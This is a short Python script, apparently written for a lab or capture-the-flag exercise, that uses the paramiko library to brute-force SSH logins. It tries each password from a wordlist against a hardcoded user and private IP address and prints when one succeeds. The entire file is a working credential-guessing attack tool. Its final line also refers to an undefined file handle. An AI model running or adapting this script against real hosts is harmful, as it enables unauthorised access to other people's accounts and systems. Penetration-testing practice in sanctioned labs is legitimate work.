#!/usr/bin/env python3

import paramiko
import sys
import os

target = "10.10.4.124" #str(input('Please enter target IP address: '))
username = "tiffany" #str(input('Please enter username to bruteforce: '))
password_file = "./wordlist.txt" #str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            print("Testing: "+username+":"+password,end="")
            response = ssh_connect(password)

            if response == 0:
                 print(" - password found!")
                 exit(0)
            elif response == 1: 
                print(" - failed")
        except Exception as e:
            print(e)
        pass

input_file.close()
